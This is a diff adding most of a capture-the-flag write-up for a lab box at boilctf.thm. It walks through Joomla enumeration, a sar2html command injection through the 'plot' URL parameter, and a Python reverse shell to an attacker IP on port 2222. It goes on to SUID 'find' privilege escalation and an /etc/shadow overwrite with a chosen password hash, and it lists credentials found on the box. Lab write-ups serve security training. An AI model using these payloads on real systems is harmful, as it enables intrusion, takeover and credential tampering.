@@ -33,19 +33,65 @@ MYSQL_DATABASE: joomla_ut
      MYSQL_ROOT_PASSWORD: joomla_ut
 ```
 
+I even tried to use Joomla scaner, but didn't find anything useful.
+```
 Joomla version is: 3.9.12
 
 > Joomla! Core 1.5.0 - 3.9.4 - Directory Traversal / Authenticated Arbitrary File Deletion 
 > Joomla! 3.9.0 < 3.9.7 - CSV Injection
+```
 
+Also I spent a lot of time visiting all the folders, which was a really bad idea. Some interesting stuff that I found there, even though they were not useful at all.
 tests/codeception/\_support/Shared/UserCredentials.php
-
+```
 http://boilctf.thm/joomla/media/editors/
 
-```
 codemirror/
 none/
 tinymce/
 ```
 
+After some time, I realized that I need another tactic. I remembered that there was some weird thing on the _\_test_ page. So I went there. 
+![sar2html](./imgs/sar2html.png)
+Then I googled sar2html exploit and found what I needed. It turns out that to exploit the thing we just need to change the url a little bit.<br>
+This is a good url which supposed to give us something whatever.<br>
+http://boilctf.thm/joomla/_test/index.php?plot=LINUX<br>
+But if we change it to:
+http://boilctf.thm/joomla/_test/index.php?plot=;whoami and click on the Select Host button<br>
+we get some additional result there, which is a response to our command:
+![whoami](./imgs/whoami)
+
+I set up an _nc_ listener on port *2222* and used a simple python reverse-shell which I found on the internet. Therefore, eventually my url looked like this:<br>
+```
+http://boilctf.thm/joomla/_test/index.php?plot=;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.2.116.12",2222));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
+```
+
+And at this point we got a reverse-shell. Here is the contents of the _log.txt_ file that was in the folder.
 ![log.txt](./imgs/log.txt.png)
+So we got usernames and password there.
+username: _basterd_<br>
+username: _pentest_<br>
+password: _superduperp@$$_<br>
+**But that actually doesn't matter :)**<br>
+
+I used this command to search for files on the system with the setuid (SUID) permission bit set for the owner.
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+There were many files, but the more experience you have the more you understand which files you should look for. So the interesting executable for me was _find_.
+I went to https://gtfobins.github.io/gtfobins/find/ and found that I can escalate my privileges with this command: 
+```
+find . -exec /bin/sh -p \; -quit
+```
+So I excuted it and got root.
+
+Even though that reverse-shell worked I wanted to connect via _ssh_ to the machine.
+ssh was not on port 22 it. Reading ssh config file (/etc/ssh/sshd_conf) found that it was running on port 55007.
+
+Also I couldn't connect directly to root so I created my own hash of a password. And changed the `/etc/shadow` file a little bit.
+```
+openssl passwd -6 -salt xyz yourpass
+$6$xyz$VKswtvLoVpOLcpjDMIFXhxa8ukqqKSKHjcPBLZUk9NxWldmlFQY4stUGo.QjEhav7mp86ih2PRqYPqjkhWi5y.
+sed -i 's/^basterd:[^:]\*:/basterd:$6$xyz$VKswtvLoVpOLcpjDMIFXhxa8ukqqKSKHjcPBLZUk9NxWldmlFQY4stUGo.QjEhav7mp86ih2PRqYPqjkhWi5y.:/' /etc/shadow
+```
+And that let me connect via _ssh_.
